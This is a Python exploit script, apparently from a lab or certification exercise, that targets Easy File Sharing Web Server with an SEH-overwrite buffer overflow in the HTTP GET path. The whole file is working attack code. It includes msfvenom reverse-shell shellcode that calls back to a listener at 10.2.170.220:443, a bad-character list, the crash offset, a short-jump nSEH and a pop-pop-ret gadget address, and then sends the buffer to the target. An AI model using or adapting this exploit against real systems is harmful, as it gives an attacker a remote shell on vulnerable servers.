#!/usr/bin/python3

import socket
import struct

ip = "10.2.170.214"
port = 80

prefix=b"GET "
endfix=b" HTTP/1.1\r\n"


charslist = ""               
badchars = [0x00,0x20,0x25,0x2b,0x2f,0x5c]         

for i in range (0x00, 0xFF+1):
        if i not in badchars:   
                charslist += chr(i) 

#msfvenom -p windows/shell_reverse_tcp LHOST=10.2.170.220 LPORT=443 EXITFUNC=thread -f c -a x86 -b '\x00\x20\x25\x2b\x2f\x5c'
shellcode = (b"\xda\xcd\xd9\x74\x24\xf4\xb8\xe6\xea\x9a\xee\x5e\x31\xc9\xb1"
b"\x52\x31\x46\x17\x83\xc6\x04\x03\xa0\xf9\x78\x1b\xd0\x16\xfe"
b"\xe4\x28\xe7\x9f\x6d\xcd\xd6\x9f\x0a\x86\x49\x10\x58\xca\x65"
b"\xdb\x0c\xfe\xfe\xa9\x98\xf1\xb7\x04\xff\x3c\x47\x34\xc3\x5f"
b"\xcb\x47\x10\xbf\xf2\x87\x65\xbe\x33\xf5\x84\x92\xec\x71\x3a"
b"\x02\x98\xcc\x87\xa9\xd2\xc1\x8f\x4e\xa2\xe0\xbe\xc1\xb8\xba"
b"\x60\xe0\x6d\xb7\x28\xfa\x72\xf2\xe3\x71\x40\x88\xf5\x53\x98"
b"\x71\x59\x9a\x14\x80\xa3\xdb\x93\x7b\xd6\x15\xe0\x06\xe1\xe2"
b"\x9a\xdc\x64\xf0\x3d\x96\xdf\xdc\xbc\x7b\xb9\x97\xb3\x30\xcd"
b"\xff\xd7\xc7\x02\x74\xe3\x4c\xa5\x5a\x65\x16\x82\x7e\x2d\xcc"
b"\xab\x27\x8b\xa3\xd4\x37\x74\x1b\x71\x3c\x99\x48\x08\x1f\xf6"
b"\xbd\x21\x9f\x06\xaa\x32\xec\x34\x75\xe9\x7a\x75\xfe\x37\x7d"
b"\x7a\xd5\x80\x11\x85\xd6\xf0\x38\x42\x82\xa0\x52\x63\xab\x2a"
b"\xa2\x8c\x7e\xfc\xf2\x22\xd1\xbd\xa2\x82\x81\x55\xa8\x0c\xfd"
b"\x46\xd3\xc6\x96\xed\x2e\x81\x92\xf3\x9a\x8d\xcb\xf1\xda\x2c"
b"\xb7\x7f\x3c\x44\xd7\x29\x97\xf1\x4e\x70\x63\x63\x8e\xae\x0e"
b"\xa3\x04\x5d\xef\x6a\xed\x28\xe3\x1b\x1d\x67\x59\x8d\x22\x5d"
b"\xf5\x51\xb0\x3a\x05\x1f\xa9\x94\x52\x48\x1f\xed\x36\x64\x06"
b"\x47\x24\x75\xde\xa0\xec\xa2\x23\x2e\xed\x27\x1f\x14\xfd\xf1"
b"\xa0\x10\xa9\xad\xf6\xce\x07\x08\xa1\xa0\xf1\xc2\x1e\x6b\x95"
b"\x93\x6c\xac\xe3\x9b\xb8\x5a\x0b\x2d\x15\x1b\x34\x82\xf1\xab"
b"\x4d\xfe\x61\x53\x84\xba\x82\xb6\x0c\xb7\x2a\x6f\xc5\x7a\x37"
b"\x90\x30\xb8\x4e\x13\xb0\x41\xb5\x0b\xb1\x44\xf1\x8b\x2a\x35"
b"\x6a\x7e\x4c\xea\x8b\xab")

offset = 4065

#nasm > jmp short 8
nseh = b"\xeb\x06\x90\x90"
junk = b"A" * (offset - len(nseh))
#0x1001ab5f : pop ebp # pop ebx # ret 0x0c |  {PAGE_EXECUTE_READ} [ImageLoad.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\EFS Software\Easy File Sharing Web Server\ImageLoad.dll)
seh = struct.pack("<I", 0x1001ab5f)
nopssled = b"\x90"*32
padding = b"C" * (5000 - len(junk) - len(nseh) - len(seh) - len(shellcode) - len(nopssled))

buffer = prefix + junk + nseh + seh + nopssled + shellcode + padding + endfix
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip, port))
    print("Sending evil buffer...")
    s.send(buffer + b"\r\n")
    print("Let's Rock and Roll!")
except:
    print("Could not connect.")
